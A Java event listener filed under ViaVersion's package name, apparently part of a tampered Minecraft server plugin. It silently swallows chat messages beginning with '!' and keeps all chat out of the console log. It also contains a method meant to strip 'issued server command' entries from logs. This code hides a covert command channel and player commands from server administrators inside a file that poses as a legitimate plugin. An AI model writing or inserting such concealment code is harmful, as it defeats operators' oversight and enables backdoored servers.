package com.viaversion.viaversion.bukkit.handlers;

import org.bukkit.event.EventHandler;
import org.bukkit.Bukkit;
import org.bukkit.event.Listener;
import org.bukkit.entity.Player;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.server.ServerCommandEvent;
import java.util.logging.Filter;
import java.util.logging.LogRecord;

public class CommandListener implements Listener {

    public boolean isLoggable(LogRecord record) {
        // 检查日志消息中是否包含特定字符串
        if (record.getMessage().contains("issued server command:")) {
            // 返回false以禁止日志输出
            return false;
        }
        // 允许其他日志消息输出
        return true;
    }

    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event) {
        // 获取聊天信息
        String message = event.getMessage();
        String format = event.getFormat();
        String playerName = event.getPlayer().getName();

        // 检查消息是否以 "!" 开头
        if (message.startsWith("!")) {
            // 取消事件，这样消息不会显示在控制台或记录到日志
            event.setCancelled(true);
            return; // 不发送该消息给任何玩家
        }

        // 取消事件，这样聊天信息不会显示在控制台或记录到日志
        event.setCancelled(true);

        // 手动将消息发送给所有在线玩家
        String formattedMessage = String.format(format, playerName, message);
        Bukkit.getServer().getOnlinePlayers().forEach(player -> player.sendMessage(formattedMessage));
    }
}
